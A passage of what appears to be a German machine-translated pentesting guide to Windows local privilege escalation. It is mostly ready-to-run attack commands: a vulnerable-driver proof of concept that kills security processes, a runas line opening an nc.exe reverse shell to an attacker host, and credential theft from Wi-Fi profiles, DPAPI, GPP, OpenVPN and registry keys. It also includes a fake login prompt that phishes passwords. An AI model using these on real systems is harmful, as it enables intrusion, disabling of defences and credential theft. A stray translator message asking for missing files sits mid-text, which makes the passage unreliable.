icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Beim Systemstart ausführen

**Prüfe, ob du einige registry- oder binary-Dateien überschreiben kannst, die von einem anderen Benutzer ausgeführt werden.**\
**Lies** die **folgende Seite**, um mehr über interessante **autoruns locations to escalate privileges** zu erfahren:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Treiber

Suche nach möglichen **third party weird/vulnerable** Treibern
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Wenn ein Treiber eine arbitrary kernel read/write primitive offenlegt (häufig in schlecht gestalteten IOCTL-Handlern), kann man durch das Stehlen eines SYSTEM token direkt aus dem Kernel-Speicher eskalieren. Die Schritt‑für‑Schritt‑Technik siehe hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitive für Registry-Hive-Speicherkorruption

Moderne Hive-Schwachstellen erlauben es, deterministische Layouts vorzubereiten, beschreibbare untergeordnete Schlüssel von HKLM/HKU auszunutzen und Metadatenkorruption ohne eigenen Treiber in kernel paged-pool overflows umzuwandeln. Die komplette Kette hier:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Ausnutzen des fehlenden FILE_DEVICE_SECURE_OPEN bei Device-Objekten (LPE + EDR kill)

Einige signierte Drittanbieter-Treiber erstellen ihr Device-Objekt mit einer starken SDDL via IoCreateDeviceSecure, vergessen aber, FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics zu setzen. Ohne dieses Flag wird die sichere DACL nicht durchgesetzt, wenn das Device über einen Pfad geöffnet wird, der eine zusätzliche Komponente enthält, sodass jeder nicht-privilegierte Benutzer einen Handle erhalten kann, indem er einen Namespace-Pfad wie verwendet:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Sobald ein Benutzer das Device öffnen kann, können die vom Treiber exponierten privilegierten IOCTLs für LPE und Manipulation missbraucht werden. Beispielhafte Fähigkeiten, die in der Praxis beobachtet wurden:
- Rückgabe von full-access handles an beliebige Prozesse (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Uneingeschränkter direkter Lese-/Schreibzugriff auf Datenträger (offline tampering, boot-time persistence tricks).
- Beenden beliebiger Prozesse, einschließlich Protected Process/Light (PP/PPL), wodurch AV/EDR kill aus dem Userland via Kernel möglich wird.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Gegenmaßnahmen für Entwickler
- Setzen Sie immer FILE_DEVICE_SECURE_OPEN, wenn Sie Device-Objekte erstellen, die durch eine DACL eingeschränkt werden sollen.
- Validieren Sie den Aufruferkontext für privilegierte Operationen. Fügen Sie PP/PPL-Prüfungen hinzu, bevor Sie Prozessbeendigung oder Rückgabe von Handles zulassen.
- Beschränken Sie IOCTLs (access masks, METHOD_*, input validation) und erwägen Sie brokered models anstelle direkter Kernel-Privilegien.

Erkennungsansätze für Verteidiger
- Überwachen Sie user-mode opens von verdächtigen Gerätenamen (z. B. \\ .\\amsdk*) und spezifische IOCTL-Sequenzen, die auf Missbrauch hindeuten.
- Setzen Sie Microsofts Blockliste für verwundbare Treiber durch (HVCI/WDAC/Smart App Control) und pflegen Sie eigene Allow/Deny-Listen.


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Weitere Informationen, wie dieser Check ausgenutzt werden kann:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Netzwerk

### Freigaben
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Prüfe auf andere bekannte Computer, die in der hosts file hardcoded sind
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netzwerkschnittstellen & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Offene Ports

Prüfe auf **eingeschränkte Dienste** von außen
```bash
netstat -ano #Opened ports?
```
### Routing-Tabelle
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP-Tabelle
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall-Regeln

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(Regeln auflisten, Regeln erstellen, ausschalten, ausschalten...)**

Mehr[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Die Binärdatei `bash.exe` kann auch in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` gefunden werden.

Wenn du root user erhältst, kannst du auf jedem Port lauschen (das erste Mal, wenn du `nc.exe` benutzt, um auf einem Port zu lauschen, fragt eine GUI, ob `nc` von der Firewall erlaubt werden soll).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Um bash einfach als root zu starten, können Sie `--default-user root` ausprobieren.

Sie können das `WSL`-Dateisystem im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` erkunden.

## Windows-Anmeldeinformationen

### Winlogon-Anmeldeinformationen
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials-Manager / Windows Vault

Von [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Der Windows Vault speichert Benutzeranmeldeinformationen für Server, Websites und andere Programme, bei denen **Windows** die Benutzer **automatisch anmelden** kann. Auf den ersten Blick könnte es so aussehen, als könnten Benutzer dort ihre Facebook-, Twitter- oder Gmail-Anmeldedaten usw. speichern, damit sie sich automatisch in Browsern anmelden. Aber das ist nicht der Fall.

Der Windows Vault speichert Anmeldeinformationen, mit denen **Windows** Benutzer automatisch anmelden kann, was bedeutet, dass jede **Windows-Anwendung, die Anmeldeinformationen zum Zugriff auf eine Ressource** (Server oder Website) **diesen Credential Manager nutzen kann** und den Windows Vault verwendet, um die bereitgestellten Anmeldeinformationen zu verwenden, anstatt dass Benutzer ständig Benutzername und Passwort eingeben müssen.

Sofern die Anwendungen nicht mit dem Credential Manager interagieren, halte ich es für unwahrscheinlich, dass sie die Anmeldeinformationen für eine bestimmte Ressource verwenden können. Wenn Ihre Anwendung also den Vault nutzen möchte, sollte sie auf irgendeine Weise **mit dem credential manager kommunizieren und die Anmeldeinformationen für diese Ressource** vom Standard-Speicher-Vault anfordern.

Verwende `cmdkey`, um die gespeicherten Anmeldeinformationen auf dem Rechner aufzulisten.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dann können Sie `runas` mit der Option `/savecred` verwenden, um die gespeicherten Anmeldeinformationen zu nutzen. Das folgende Beispiel ruft eine entfernte Binärdatei über eine SMB-Freigabe auf.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Verwendung von `runas` mit bereitgestellten Anmeldeinformationen.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Beachte, dass mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), oder das [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) verwendet werden können.

### DPAPI

Die **Data Protection API (DPAPI)** stellt eine Methode zur symmetrischen Verschlüsselung von Daten bereit, die vorwiegend im Windows-Betriebssystem für die symmetrische Verschlüsselung asymmetrischer privater Schlüssel verwendet wird. Diese Verschlüsselung nutzt ein Benutzer- oder Systemgeheimnis, das erheblich zur Entropie beiträgt.

DPAPI ermöglicht die Verschlüsselung von Schlüsseln über einen symmetrischen Schlüssel, der aus den Login-Geheimnissen des Benutzers abgeleitet wird. In Szenarien mit Systemverschlüsselung verwendet es die Domain-Authentifizierungsgeheimnisse des Systems.

Verschlüsselte Benutzer-RSA-Schlüssel werden bei Verwendung von DPAPI im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` den Benutzer-[Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) darstellt. **Der DPAPI-Schlüssel, der zusammen mit dem Master-Key, der die privaten Schlüssel des Benutzers in derselben Datei schützt, abgelegt ist**, besteht typischerweise aus 64 Bytes Zufallsdaten. (Es ist wichtig zu beachten, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist, sodass dessen Inhalt nicht mit dem `dir`-Befehl in CMD aufgelistet werden kann, obwohl es über PowerShell aufgelistet werden kann).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Sie können **mimikatz module** `dpapi::masterkey` mit den entsprechenden Argumenten (`/pvk` oder `/rpc`) verwenden, um es zu entschlüsseln.

Die **credentials files protected by the master password** befinden sich normalerweise in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Du kannst das **mimikatz module** `dpapi::cred` mit dem passenden `/masterkey` verwenden, um zu entschlüsseln.\
Du kannst viele **DPAPI** **masterkeys** aus dem **memory** mit dem `sekurlsa::dpapi` module extrahieren (wenn du root bist).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Anmeldeinformationen

**PowerShell-Anmeldeinformationen** werden oft für Skripting- und Automatisierungsaufgaben verwendet, um verschlüsselte Zugangsdaten bequem zu speichern. Die Anmeldeinformationen werden mit **DPAPI** geschützt, was typischerweise bedeutet, dass sie nur vom selben Benutzer auf demselben Computer, auf dem sie erstellt wurden, entschlüsselt werden können.

Um eine PS-Anmeldeinformation aus der Datei, die sie enthält, zu **entschlüsseln**, kannst du Folgendes tun:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### WLAN
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gespeicherte RDP-Verbindungen

Sie finden sie unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
und in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Zuletzt ausgeführte Befehle
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote-Desktop-Anmeldeinformations-Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Verwenden Sie das **Mimikatz** `dpapi::rdg`-Modul mit dem entsprechenden `/masterkey`, um **beliebige .rdg-Dateien zu entschlüsseln**.\
Sie können **viele DPAPI masterkeys** aus dem Speicher mit dem Mimikatz `sekurlsa::dpapi`-Modul extrahieren.

### Sticky Notes

Viele Nutzer verwenden die StickyNotes-App auf Windows-Workstations, um **Passwörter** und andere Informationen zu speichern, ohne zu merken, dass es sich um eine Datenbankdatei handelt. Diese Datei befindet sich unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` und lohnt sich immer, danach zu suchen und sie zu untersuchen.

### AppCmd.exe

**Hinweis: Um Passwörter aus AppCmd.exe wiederherzustellen, müssen Sie Administrator sein und unter einem High Integrity level laufen.**\
**AppCmd.exe** befindet sich im Verzeichnis `%systemroot%\system32\inetsrv\`.\ 
Wenn diese Datei existiert, ist es möglich, dass einige **credentials** konfiguriert wurden und **wiederhergestellt** werden können.

Dieser Code wurde aus [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) extrahiert:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Prüfe, ob `C:\Windows\CCM\SCClient.exe` existiert .\
Installer werden **mit SYSTEM-Rechten ausgeführt**, viele sind anfällig für **DLL Sideloading (Info von** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dateien und Registry (Anmeldeinformationen)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Hostschlüssel
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH-Schlüssel in der Registry

Private SSH-Schlüssel können im Registry-Schlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert werden, daher solltest du prüfen, ob dort etwas Interessantes enthalten ist:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Wenn Sie einen Eintrag in diesem Pfad finden, handelt es sich wahrscheinlich um einen gespeicherten SSH key. Er ist verschlüsselt gespeichert, kann aber mit [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) einfach entschlüsselt werden.\
Mehr Informationen zu dieser Technik hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

If `ssh-agent` service is not running and you want it to automatically start on boot run:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Es scheint, dass diese Technik nicht mehr gültig ist. Ich habe versucht, einige ssh-Keys zu erstellen, sie mit `ssh-add` hinzuzufügen und mich per ssh bei einer Maschine anzumelden. Der Registry-Schlüssel HKCU\Software\OpenSSH\Agent\Keys existiert nicht und procmon hat während der asymmetrischen Schlüssel-Authentifizierung nicht die Verwendung von `dpapi.dll` festgestellt.
  
### Unbeaufsichtigte Dateien
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Du kannst diese Dateien auch mit **metasploit** durchsuchen: _post/windows/gather/enum_unattend_

Beispielinhalt:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM- und SYSTEM-Sicherungen
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud-Zugangsdaten
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Suche nach einer Datei namens **SiteList.xml**

### Cached GPP Passwort

Früher gab es eine Funktion, mit der benutzerdefinierte lokale Administrator-Konten über Group Policy Preferences (GPP) auf einer Gruppe von Rechnern bereitgestellt werden konnten. Diese Methode wies jedoch gravierende Sicherheitsmängel auf. Erstens konnten die Group Policy Objects (GPOs), die als XML-Dateien in SYSVOL gespeichert sind, von jedem Domain-Benutzer eingesehen werden. Zweitens konnten die Passwörter in diesen GPPs, die mit AES256 unter Verwendung eines öffentlich dokumentierten Standard-Keys verschlüsselt sind, von jedem authentifizierten Benutzer entschlüsselt werden. Dies stellte ein erhebliches Risiko dar, da Benutzer dadurch erhöhte Privilegien erlangen konnten.

Um dieses Risiko zu mindern, wurde eine Funktion entwickelt, die nach lokal zwischengespeicherten GPP-Dateien sucht, die ein nicht-leeres "cpassword"-Feld enthalten. Wird eine solche Datei gefunden, entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details zur GPP und zum Speicherort der Datei und unterstützt so bei der Identifikation und Behebung dieser Sicherheitslücke.

Suche in `C:\ProgramData\Microsoft\Group Policy\history` oder in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor Windows Vista)_ nach diesen Dateien:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Um das cPassword zu entschlüsseln:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec verwenden, um Passwörter zu erhalten:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web-Konfiguration
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Beispiel für eine web.config mit credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN Zugangsdaten
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Nach credentials fragen

Du kannst den Benutzer immer **bitten, seine credentials einzugeben oder sogar die credentials eines anderen Benutzers**, wenn du denkst, dass er sie kennen könnte (beachte, dass es wirklich **riskant** ist, den client direkt nach den **credentials** zu **fragen**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Mögliche Dateinamen, die credentials enthalten**

Bekannte Dateien, die vor einiger Zeit **passwords** im **clear-text** oder als **Base64** enthielten
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Ich habe die Dateien nicht — bitte füge den Inhalt von src/windows-hardening/windows-local-privilege-escalation/README.md (oder die Liste der zu durchsuchenden Dateien) hier ein, damit ich den relevanten englischen Text ins Deutsche übersetzen kann.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials im RecycleBin

Sie sollten außerdem den Bin überprüfen, um darin nach credentials zu suchen

Um **passwords** wiederherzustellen, die von mehreren Programmen gespeichert wurden, können Sie Folgendes verwenden: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Innerhalb der registry

**Andere mögliche registry-Keys mit credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browser-Verlauf

Sie sollten nach DBs suchen, in denen Passwörter von **Chrome oder Firefox** gespeichert sind.\
Prüfen Sie außerdem Verlauf, Lesezeichen und Favoriten der Browser, da dort möglicherweise einige **Passwörter** gespeichert sind.

Tools zum Extrahieren von Passwörtern aus Browsern:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

